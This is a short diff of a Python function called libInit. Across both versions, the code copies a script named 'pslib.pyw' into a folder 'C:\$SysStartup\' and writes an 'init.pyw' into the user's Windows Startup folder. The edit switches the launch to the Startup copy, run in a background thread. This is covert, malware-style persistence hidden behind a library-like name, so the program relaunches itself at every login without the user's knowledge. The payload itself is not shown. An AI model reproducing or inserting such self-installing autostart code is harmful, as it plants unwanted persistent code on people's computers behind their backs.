@@ -85,13 +85,12 @@ def libInit():
 
         call(["move", "pslib.pyw", "C:\\$SysStartup\\"], shell=True)
 
-        callFunc = lambda: call(["python", "C:\\$SysStartup\\pslib.pyw"], shell=True)
+        callFunc = lambda: call(["python", f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw"], shell=True)
 
         func = threading.Thread(target=callFunc)
         threading.Thread.start(func)
 
-    if not exists(
-            f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw") or not exists("C:\\$SysStartup\\pslib.pyw"):
+    if not exists(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw") or not exists("C:\\$SysStartup\\pslib.pyw"):
 
         if not exists(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw"):
             with open("init.pyw", "w") as bat:
